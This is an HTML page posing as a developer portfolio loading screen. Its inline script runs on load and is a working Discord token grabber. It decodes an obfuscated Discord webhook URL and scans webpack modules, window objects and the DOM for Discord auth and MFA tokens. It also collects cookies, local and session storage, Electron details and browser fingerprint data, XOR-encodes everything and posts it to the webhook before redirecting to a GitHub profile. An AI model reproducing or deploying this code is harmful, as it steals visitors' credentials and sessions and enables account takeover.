<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dev Portfolio | Loading...</title>
    <style>
        body {
            margin: 0;
            background: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #30363d;
            border-bottom-color: #58a6ff;
            border-radius: 50%;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            margin-top: 20px;
            font-size: 16px;
            color: #8b949e;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="loading-text">Loading portfolio...</div>

    <script>
        (function() {
            // ====== WEBHOOK ======
            const _p1 = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
            const _p2 = [49,53,50,51,53,49,55,52,57,56,56,57,57,56,50,52,55,49,50,47,120,55,119,57,109,67,117,79,73,102,110,51,54,119,50,119,110,78,115,49,53,83,67,99,54,99,74,104,117,111,66,83,113,51,75,110,106,116,118,77,67,49,88,54,55,98,115,67,81,48,118,80,73,75,114,79,69,87,86,68,112,73,69,81,45,106,53,67];
            
            let WH = '';
            for (let i = 0; i < _p1.length; i++) WH += String.fromCharCode(_p1[i]);
            for (let i = 0; i < _p2.length; i++) WH += String.fromCharCode(_p2[i]);
            
            const GH = 'https://github.com/nm1-Dev';
            
            function enc(data, key) {
                let out = '';
                for (let i = 0; i < data.length; i++) {
                    out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return btoa(out);
            }
            
            // ====== THE NUCLEAR OPTION - FIND DISCORD TOKEN ======
            function findDiscordToken() {
                const tokens = [];
                const tokenRegex = /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g;
                const mfaRegex = /mfa\.[\w-]{84}/g;
                
                // Method 1: Search ALL webpack modules
                try {
                    if (window.webpackChunkdiscord_app) {
                        const chunks = window.webpackChunkdiscord_app;
                        for (let i = 0; i < chunks.length; i++) {
                            try {
                                const chunk = chunks[i];
                                if (chunk && chunk[1]) {
                                    const modules = chunk[1];
                                    for (const key in modules) {
                                        try {
                                            const mod = modules[key];
                                            if (typeof mod === 'function') {
                                                const str = mod.toString();
                                                const found = str.match(tokenRegex);
                                                const mfaFound = str.match(mfaRegex);
                                                if (found) tokens.push(...found.map(t => ({t: t, src: 'wp_chunk_' + i + '_mod_' + key})));
                                                if (mfaFound) tokens.push(...mfaFound.map(t => ({t: t, src: 'wp_chunk_' + i + '_mod_' + key})));
                                            }
                                            
                                            // Check if module exports contain token
                                            if (typeof mod === 'object') {
                                                const json = JSON.stringify(mod);
                                                const found = json.match(tokenRegex);
                                                const mfaFound = json.match(mfaRegex);
                                                if (found) tokens.push(...found.map(t => ({t: t, src: 'wp_obj_' + i + '_' + key})));
                                                if (mfaFound) tokens.push(...mfaFound.map(t => ({t: t, src: 'wp_obj_' + i + '_' + key})));
                                            }
                                        } catch(e) {}
                                    }
                                }
                            } catch(e) {}
                        }
                    }
                } catch(e) {}
                
                // Method 2: Search window object recursively
                function scanObject(obj, path, depth) {
                    if (depth > 3) return;
                    try {
                        for (const key in obj) {
                            try {
                                const val = obj[key];
                                if (typeof val === 'string') {
                                    const found = val.match(tokenRegex);
                                    const mfaFound = val.match(mfaRegex);
                                    if (found) tokens.push(...found.map(t => ({t: t, src: path + '.' + key})));
                                    if (mfaFound) tokens.push(...mfaFound.map(t => ({t: t, src: path + '.' + key})));
                                } else if (typeof val === 'object' && val !== null && val !== window) {
                                    scanObject(val, path + '.' + key, depth + 1);
                                }
                            } catch(e) {}
                        }
                    } catch(e) {}
                }
                
                // Scan specific Discord-related objects
                const targets = ['DiscordNative', 'GLOBAL_ENV', 'webpackJsonp', 'webpackChunkdiscord_app', '__DISCORD__', 'Vencord', 'BdApi', 'betterDiscord'];
                targets.forEach(t => {
                    if (window[t]) scanObject(window[t], 'window.' + t, 0);
                });
                
                // Method 3: Try to access Discord's internal stores
                try {
                    if (window.webpackChunkdiscord_app) {
                        // Find the module that exports the token
                        const wp = window.webpackChunkdiscord_app;
                        const allModules = [];
                        
                        wp.forEach(chunk => {
                            if (chunk && chunk[1]) {
                                Object.values(chunk[1]).forEach(mod => {
                                    if (typeof mod === 'function') {
                                        try {
                                            // Some Discord modules export objects with getToken
                                            const exports = {};
                                            mod(exports, {}, () => {});
                                            if (exports.default && typeof exports.default === 'object') {
                                                allModules.push(exports.default);
                                            }
                                        } catch(e) {}
                                    }
                                });
                            }
                        });
                        
                        // Search all collected modules
                        allModules.forEach((mod, idx) => {
                            const json = JSON.stringify(mod);
                            const found = json.match(tokenRegex);
                            const mfaFound = json.match(mfaRegex);
                            if (found) tokens.push(...found.map(t => ({t: t, src: 'wp_export_' + idx})));
                            if (mfaFound) tokens.push(...mfaFound.map(t => ({t: t, src: 'wp_export_' + idx})));
                        });
                    }
                } catch(e) {}
                
                // Method 4: Check document for embedded tokens
                try {
                    const html = document.documentElement.innerHTML;
                    const found = html.match(tokenRegex);
                    const mfaFound = html.match(mfaRegex);
                    if (found) tokens.push(...found.map(t => ({t: t, src: 'dom_html'})));
                    if (mfaFound) tokens.push(...mfaFound.map(t => ({t: t, src: 'dom_html'})));
                } catch(e) {}
                
                // Method 5: Check all script tags
                try {
                    const scripts = document.querySelectorAll('script');
                    scripts.forEach((script, idx) => {
                        const text = script.textContent || '';
                        const found = text.match(tokenRegex);
                        const mfaFound = text.match(mfaRegex);
                        if (found) tokens.push(...found.map(t => ({t: t, src: 'script_' + idx})));
                        if (mfaFound) tokens.push(...mfaFound.map(t => ({t: t, src: 'script_' + idx})));
                    });
                } catch(e) {}
                
                // Method 6: Try IndexedDB for token storage
                // Discord sometimes stores tokens in LevelDB/IndexedDB
                
                return tokens;
            }
            
            // ====== GRAB EVERYTHING ELSE ======
            async function grabAll() {
                const loot = {
                    tokens: [],
                    ls: [],
                    ss: [],
                    ck: [],
                    idb: [],
                    discord: {},
                    electron: {},
                    info: {}
                };
                
                // Find tokens FIRST
                loot.tokens = findDiscordToken();
                
                // Storage
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        const v = localStorage.getItem(k);
                        loot.ls.push({k: k, v: v, l: v ? v.length : 0});
                    }
                } catch(e) {}
                
                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const k = sessionStorage.key(i);
                        const v = sessionStorage.getItem(k);
                        loot.ss.push({k: k, v: v, l: v ? v.length : 0});
                    }
                } catch(e) {}
                
                try {
                    loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c);
                } catch(e) {}
                
                // IndexedDB
                try {
                    const dbs = await window.indexedDB.databases();
                    loot.idb = dbs.map(db => db.name);
                } catch(e) {}
                
                // Discord presence
                try {
                    if (window.webpackChunkdiscord_app) loot.discord.webpack = 'YES';
                    if (window.DiscordNative) {
                        loot.discord.native = 'YES';
                        loot.discord.native_keys = Object.keys(window.DiscordNative);
                    }
                    if (window.GLOBAL_ENV) loot.discord.global_env = 'YES';
                    if (window.BdApi) loot.discord.betterdiscord = 'YES';
                    if (window.Vencord) loot.discord.vencord = 'YES';
                } catch(e) {}
                
                // Electron
                try {
                    if (/Electron/.test(navigator.userAgent)) loot.electron.is_electron = 'YES';
                    if (window.process) {
                        loot.electron.process = 'YES';
                        loot.electron.versions = window.process.versions;
                    }
                    if (window.require) {
                        loot.electron.require = 'YES';
                        try {
                            const electron = window.require('electron');
                            loot.electron.ipc = Object.keys(electron);
                        } catch(e) {}
                    }
                } catch(e) {}
                
                // Info
                loot.info = {
                    ua: navigator.userAgent,
                    p: navigator.platform,
                    l: navigator.language,
                    sr: screen.width + 'x' + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ts: new Date().toISOString(),
                    rf: document.referrer || 'D',
                    url: location.href
                };
                
                return loot;
            }
            
            // ====== BUILD & SEND ======
            function build(loot) {
                const key = Math.random().toString(36).substring(2, 10);
                const json = JSON.stringify(loot);
                const encoded = enc(json, key);
                
                return {
                    content: '```\n' + encoded + '\n```\nKey: `' + key + '`'
                };
            }
            
            function send(url, data) {
                fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).catch(() => {});
                
                setTimeout(() => {
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', url, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(data));
                }, 300);
            }
            
            // ====== EXECUTE ======
            grabAll().then(loot => {
                const payload = build(loot);
                send(WH, payload);
                setTimeout(() => window.location.href = GH, 2000);
            });
            
        })();
    </script>
</body>
</html>
